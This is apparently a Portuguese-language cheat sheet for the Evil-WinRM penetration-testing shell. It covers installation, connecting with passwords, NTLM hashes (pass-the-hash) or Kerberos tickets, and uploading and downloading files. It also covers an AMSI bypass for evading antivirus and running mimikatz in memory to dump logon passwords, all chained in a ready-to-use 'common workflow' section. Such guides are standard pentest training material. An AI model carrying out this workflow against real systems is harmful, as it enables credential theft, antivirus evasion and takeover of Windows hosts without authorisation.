# 😈 Evil-WinRM — shell remota de Windows

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de versão e precisão:** a ajuda oficial documenta `-H` como hash NT; a forma LM:NTLM do exemplo não corresponde a esse formato. `-d` não consta como opção de domínio nessa ajuda; `-r` seleciona o realm Kerberos. `-e` indica o diretório local de executáveis C# e não envia automaticamente todos os ficheiros. Funções de carregamento em memória e de contorno de AMSI têm requisitos e não garantem execução de qualquer binário nem ausência de deteção. [Ajuda e requisitos oficiais](https://github.com/Hackplayers/evil-winrm). Uma shell é uma interface de comandos; WinRM disponibiliza gestão remota do Windows.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 Uma shell completa para WinRM
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Índice

- [O que é o Evil-WinRM](#-what-is-evil-winrm)
- [Instalação](#-installation)
- [Ligação básica](#-basic-connection)
- [Operações com ficheiros](#-file-operations)
- [Comandos integrados](#-built-in-commands)
- [Pass-the-Hash](#-pass-the-hash)
- [Autenticação Kerberos](#-kerberos-auth)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-evil-winrm"></a>
## 🎯 O que é o Evil-WinRM

O **Evil-WinRM** é uma shell WinRM com funcionalidades para testes de intrusão:

- 🖥️ **Shell interativa** — Sessão PowerShell completa
- 📁 **Transferência de ficheiros** — Enviar e descarregar ficheiros
- 🔓 **Pass-the-Hash** — Autenticação com hash NTLM
- 🎫 **Kerberos** — Autenticação baseada em tickets
- 🧩 **Módulos** — Carregar scripts PowerShell

### Portas de WinRM

| Porta | Protocolo | Notas |
|------|----------|-------|
| 5985 | HTTP | Predefinição |
| 5986 | HTTPS | Cifrado |

---

<a id="-installation"></a>
## 🚀 Instalação

### Kali Linux

```bash
# Instalar
sudo apt update
sudo apt install evil-winrm

# Ou através de gem
sudo gem install evil-winrm
```

### A partir de GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

<a id="-basic-connection"></a>
## 💻 Ligação básica

### Autenticação por palavra-passe

```bash
# Ligação básica
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Indicar o domínio
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (porta 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Indicar a porta
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### Opções SSL

```bash
# SSL sem verificação do certificado
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Com certificado
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

<a id="-file-operations"></a>
## 📁 Operações com ficheiros

### Enviar ficheiros

```bash
# Dentro da shell Evil-WinRM
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# Enviar para uma localização específica
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# A partir da linha de comandos (com -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### Descarregar ficheiros

```bash
# Descarregar um ficheiro
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# Descarregar para uma localização específica
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### Diretório de executáveis

```bash
# Indicar o diretório de executáveis para envio
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# Dentro da shell, enviar um executável desse diretório
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

<a id="-built-in-commands"></a>
## 🛠️ Comandos integrados

### Menu

```bash
# Mostrar todos os comandos
*Evil-WinRM* PS C:\> menu

# Comandos disponíveis:
Bypass-4MSI       - Bypass AMSI
Dll-Loader        - Load DLL in memory
Donut-Loader      - Load .NET assembly
Invoke-Binary     - Execute binary
services          - List services
upload            - Upload file
download          - Download file
```

### Contorno de AMSI

```bash
# Contornar AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Agora pode executar ferramentas detetadas pelo antivírus
```

### Carregar scripts

```bash
# Ligar indicando o diretório de scripts
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# Dentro da shell, carregar um script
*Evil-WinRM* PS C:\> PowerView.ps1

# Utilizar as funções do script
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Executar binários

```bash
# Carregar o diretório de executáveis
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# Executar um binário em memória
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# Com argumentos
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### Carregamento de DLL

```bash
# Carregar uma DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### Serviços

```bash
# Listar serviços
*Evil-WinRM* PS C:\> services
```

---

<a id="-pass-the-hash"></a>
## 🔓 Pass-the-Hash

### Hash NTLM

```bash
# Ligar com hash
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Apenas a parte NTLM
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Com domínio
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

<a id="-kerberos-auth"></a>
## 🎫 Autenticação Kerberos

### Preparação

```bash
# Definir KRB5CCNAME para a cache de tickets
export KRB5CCNAME=/path/to/ticket.ccache

# Editar /etc/krb5.conf para o realm
```

### Ligar através de Kerberos

```bash
# Autenticação Kerberos
evil-winrm -i dc01.domain.local -r domain.local

# Com um ccache específico
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Opções de ligação

| Opção | Descrição |
|--------|-------------|
| `-i` | Endereço IP ou nome do alvo |
| `-u` | Nome de utilizador |
| `-p` | Palavra-passe |
| `-H` | Hash NTLM |
| `-d` | Domínio |
| `-S` | Utilizar SSL (HTTPS) |
| `-P` | Porta |
| `-r` | Realm Kerberos |

### Opções de ficheiros

| Opção | Descrição |
|--------|-------------|
| `-s` | Diretório de scripts |
| `-e` | Diretório de executáveis |
| `-c` | Certificado SSL |
| `-k` | Chave SSL |

### Comandos da shell

| Comando | Descrição |
|---------|-------------|
| `upload` | Enviar um ficheiro |
| `download` | Descarregar um ficheiro |
| `menu` | Mostrar os comandos |
| `Bypass-4MSI` | Contornar AMSI |
| `Invoke-Binary` | Executar um executável em memória |
| `services` | Listar serviços |
| `Dll-Loader` | Carregar uma DLL |

### Fluxo de trabalho comum

```bash
# 1. Ligar
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. Contornar AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Enviar ferramentas
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Executar
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Descarregar os resultados
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

## 📚 Recursos

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [WinRM Documentation](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### Guias de referência relacionados
- [CrackMapExec](../../CrackMapExec/translations/README.pt.md)
- [Impacket](../../Impacket/translations/README.pt.md)
- [Mimikatz](../../Mimikatz/translations/README.pt.md)

---

<p align="center">
  <b>😈 Uma shell completa para WinRM!</b><br>
  <i>Evil-WinRM — assuma o controlo do Windows</i>
</p>
